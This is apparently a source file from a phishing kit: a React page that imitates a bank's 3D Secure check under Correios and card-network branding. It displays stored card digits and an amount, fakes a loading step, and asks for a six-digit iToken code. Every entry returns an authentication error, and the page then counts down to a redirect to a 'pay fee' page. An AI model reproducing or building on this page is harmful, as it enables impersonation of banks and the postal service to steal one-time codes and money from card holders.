import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { ShieldCheck, Smartphone, Lock, ArrowLeft } from "lucide-react";
import amexLocal from "@/assets/brands/amex.svg";
import visaLocal from "@/assets/brands/visa.svg";
import mcLocal from "@/assets/brands/mastercard.svg";
import dinersLocal from "@/assets/brands/diners.svg";
import discoverLocal from "@/assets/brands/discover.svg";
import jcbLocal from "@/assets/brands/jcb.svg";
import eloLocal from "@/assets/brands/elo.svg";
import hipercardLocal from "@/assets/brands/hipercard.svg";

const brandGradients: Record<string, string> = {
	visa: "from-blue-700 to-blue-500",
	mastercard: "from-[#ff5f00] to-[#eb001b]",
	amex: "from-cyan-700 to-cyan-500",
	diners: "from-sky-700 to-sky-500",
	discover: "from-amber-600 to-orange-500",
	jcb: "from-green-700 to-green-500",
	elo: "from-gray-800 to-gray-600",
	hipercard: "from-red-700 to-red-500",
};

const displayBrand = (b: string) => (b ? b.toUpperCase() : "VISA");
const AMEX_DATA_URI = amexLocal as string;

const BRAND_ASSET: Record<string, string> = {
	visa: "https://www.svgrepo.com/show/328127/visa.svg",
	mastercard: "https://www.svgrepo.com/show/328121/mastercard.svg",
	amex: "https://www.svgrepo.com/show/328129/amex.svg",
	diners: "https://www.svgrepo.com/show/328128/diners.svg",
	discover: "https://www.svgrepo.com/show/328132/discover.svg",
	jcb: "https://www.svgrepo.com/show/328126/jcb.svg",
	elo: "https://www.svgrepo.com/show/328133/elo.svg",
	hipercard: "https://www.svgrepo.com/show/328139/hipercard.svg",
};

const ThreeDSecure = () => {
  const [verificationCode, setVerificationCode] = useState<string>("");
  const [timeLeft, setTimeLeft] = useState<number>(120);
  const [canResend, setCanResend] = useState<boolean>(false);
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const [verified, setVerified] = useState<boolean>(false);
  const [showError, setShowError] = useState<boolean>(false);
  const [redirectCountdown, setRedirectCountdown] = useState<number>(5);
  const [brand, setBrand] = useState<string>("");
  const [brandLogo, setBrandLogo] = useState<string>("");
  const [last4, setLast4] = useState<string>("1234");
  const [amount, setAmount] = useState<string>("R$ 32,64");
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [showContent, setShowContent] = useState<boolean>(false);
  const navigate = useNavigate();

  useEffect(() => {
    try {
      const info = localStorage.getItem("checkoutCardInfo");
      const amt = localStorage.getItem("checkoutAmount");
      if (info) {
        const parsed = JSON.parse(info || "{}");
        setBrand(String(parsed.brand || "").toLowerCase());
        setBrandLogo(String(parsed.brandLogo || ""));
        if (parsed.last4) setLast4(String(parsed.last4));
      }
      if (amt) setAmount(amt);
    } catch {}
    
    // Simula carregamento do ambiente seguro
    setTimeout(() => {
      setIsLoading(false);
      // Pequeno delay para garantir que a animação funcione
      setTimeout(() => {
        setShowContent(true);
        console.log('Animação iniciada');
      }, 100);
    }, 3500);
  }, []);

  useEffect(() => {
    if (verified) return; // pausa contador após verificar
    if (timeLeft <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft, verified]);

  const handleResend = () => {
    if (!canResend) return;
    setCanResend(false);
    setTimeLeft(30);
  };

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.trim().length < 6) return;
    setIsVerifying(true);
    setShowError(false);
    setTimeout(() => {
      setIsVerifying(false);
      // Mostra erro dentro do 3D Secure
      setShowError(true);
      setVerificationCode("");
      setRedirectCountdown(5);
      
      // Contagem regressiva de 5 segundos
      const countdownInterval = setInterval(() => {
        setRedirectCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(countdownInterval);
            navigate("/pagar-tarifa-pagamento");
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }, 1200);
  };

  const formattedTimer = () => {
    const m = Math.floor(timeLeft / 60)
      .toString()
      .padStart(2, "0");
    const s = (timeLeft % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  const masked = `************${last4}`;
  const brandAsset = BRAND_ASSET[brand] || brandLogo || mcLocal;

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <h2 className="text-lg font-semibold text-gray-900 mb-2">Carregando ambiente seguro</h2>
          <p className="text-sm text-gray-600">Aguarde enquanto preparamos sua autenticação...</p>
        </div>
      </div>
    );
  }

  if (!showContent) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md opacity-0">
          {/* Placeholder invisível para manter o layout */}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-8">
      <div 
        className="w-full max-w-md"
        style={{
          animation: showContent ? 'fadeIn 0.7s ease-out' : 'none',
          opacity: showContent ? 1 : 0
        }}
      >
        {/* Top bar like issuer */}
        <div className="flex items-center gap-2 text-gray-700 mb-4">
          <Button
            variant="ghost"
            size="sm"
            className="hover:bg-transparent text-gray-600"
            onClick={() => navigate(-1)}
          >
            <ArrowLeft className="w-4 h-4" />
          </Button>
          <span className="text-sm">Banco emissor • Autenticação 3D Secure</span>
        </div>

        {/* Unified Mastercard-style layout for all brands */}
        <div className="bg-white rounded-md shadow border border-gray-300">
          {/* Header logos */}
          <div className="flex items-center justify-between px-5 pt-4">
            <img
              src="/src/assets/logo-ect.svg"
              alt="Correios"
              className="h-6 w-auto"
            />
            <div className="flex items-center gap-2">
              <img
                src={brandAsset}
                alt={displayBrand(brand)}
                className="h-8 md:h-9 w-auto"
              />
              <span className="text-gray-800 text-sm font-medium">ID Check</span>
            </div>
          </div>

          {/* Body */}
          <div className="px-5 py-4 space-y-4 text-sm text-gray-800">
            <p>
              Para sua segurança, nunca compartilhe o código do seu iToken com outras pessoas. Confira os detalhes da compra e insira o código do iToken para continuar.
            </p>

            <div>
              <h3 className="text-gray-700 font-semibold mb-2">Detalhes da compra</h3>
              <div className="grid grid-cols-2 gap-y-2 text-sm">
                <div className="text-gray-600">Estabelecimento:</div>
                <div className="text-gray-900">Correios Pagamentos</div>
                <div className="text-gray-600">Valor da compra:</div>
                <div className="text-gray-900">{amount} BRL</div>
                <div className="text-gray-600">Número do cartão:</div>
                <div className="text-gray-900">{masked}</div>
              </div>
            </div>

            {!verified ? (
              <form onSubmit={handleVerify} className="space-y-4">
                {showError && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-3 mb-4">
                    <p className="text-red-700 text-sm">Erro na autenticação. Tente novamente.</p>
                    <p className="text-red-600 text-sm mt-1">
                      Redirecionando para página de pagamento em {redirectCountdown}...
                    </p>
                  </div>
                )}
                <div className="flex items-center gap-3">
                  <label className="text-gray-800 whitespace-nowrap">Insira o código iToken:</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={6}
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                    className="flex-1 rounded border border-gray-400 px-3 py-1.5 text-sm focus:border-black focus:outline-none"
                  />
                </div>

                <button
                  type="submit"
                  className="w-32 h-8 bg-black text-white text-sm font-semibold rounded-sm mx-auto block disabled:opacity-60"
                  disabled={verificationCode.length < 6 || isVerifying}
                >
                  {isVerifying ? "Verificando…" : "Continuar"}
                </button>

                <div className="flex items-center justify-between text-xs text-gray-600">
                  <a href="#" className="underline">Dúvidas sobre iToken</a>
                  <button type="button" className="underline" onClick={() => navigate(-1)}>Sair</button>
                </div>

                <div className="flex items-center justify-between mt-2 text-[11px] text-gray-500">
                  <span>3dsecure</span>
                  <span>Sessão expira em {formattedTimer()}</span>
                </div>
              </form>
            ) : null}
          </div>
        </div>
      </div>
    </div>
  );
};

export default ThreeDSecure;


